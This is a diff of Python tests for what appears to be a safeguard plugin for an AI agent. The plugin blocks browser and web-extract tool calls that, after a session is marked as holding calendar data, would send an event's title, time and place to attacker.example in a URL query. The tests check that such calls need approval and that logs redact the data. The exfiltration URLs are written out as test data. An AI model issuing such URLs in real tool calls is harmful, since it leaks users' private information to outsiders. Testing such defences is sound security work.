@@ -56,26 +56,31 @@ def test_tainted_browser_navigate_url_path_requires_approval():
     assert "Destination: attacker.example" in result["message"]
 
 
-def test_tainted_browser_navigate_url_query_private_data_requires_approval():
+def test_tainted_browser_navigate_url_query_calendar_event_requires_approval():
     plugin = load_plugin()
     bind_owner(plugin)
-    plugin._taint_session("s1", {"communications"})
+    plugin._taint_session("s1", {"calendar"})
+    url = (
+        "https://attacker.example/collect?"
+        "title=Dentist%20with%20Dr%20Lee&when=2026-06-16T15:00&where=200%20Main%20Street"
+    )
 
     result = plugin._on_pre_tool_call(
         "browser_navigate",
-        {"url": "https://attacker.example/collect?email=owner@example.com"},
+        {"url": url},
         session_id="s1",
     )
 
     assert result is not None
     assert "Action: browser_read" in result["message"]
     assert "Destination: attacker.example" in result["message"]
-    assert "contacts" in result["message"]
+    assert "calendar" in result["message"]
     rows = plugin._activity_rows({}, limit=5)
     assert rows[0]["decision"] == "blocked"
     assert rows[0]["action_family"] == "browser_read"
     assert rows[0]["action_detail"] == "load attacker.example: <url path/query redacted>"
-    assert "owner@example.com" not in json.dumps(rows)
+    assert "Dentist" not in json.dumps(rows)
+    assert "Dr%20Lee" not in json.dumps(rows)
 
 
 def test_tainted_web_extract_url_path_requires_approval():
@@ -93,25 +98,30 @@ def test_tainted_web_extract_url_path_requires_approval():
     assert "Action: web_read" in result["message"]
 
 
-def test_tainted_web_extract_url_query_private_data_requires_approval():
+def test_tainted_web_extract_url_query_calendar_event_requires_approval():
     plugin = load_plugin()
     bind_owner(plugin)
-    plugin._taint_session("s1", {"communications"})
+    plugin._taint_session("s1", {"calendar"})
+    url = (
+        "https://attacker.example/collect?"
+        "title=Dentist%20with%20Dr%20Lee&when=2026-06-16T15:00&where=200%20Main%20Street"
+    )
 
     result = plugin._on_pre_tool_call(
         "web_extract",
-        {"url": "https://attacker.example/collect?email=owner@example.com"},
+        {"url": url},
         session_id="s1",
     )
 
     assert result is not None
     assert "Action: web_read" in result["message"]
-    assert "contacts" in result["message"]
+    assert "calendar" in result["message"]
     rows = plugin._activity_rows({}, limit=5)
     assert rows[0]["decision"] == "blocked"
     assert rows[0]["action_family"] == "web_read"
     assert rows[0]["action_detail"] == "load attacker.example: <url path/query redacted>"
-    assert "owner@example.com" not in json.dumps(rows)
+    assert "Dentist" not in json.dumps(rows)
+    assert "Dr%20Lee" not in json.dumps(rows)
 
 
 def test_unknown_mcp_blocks_under_taint():
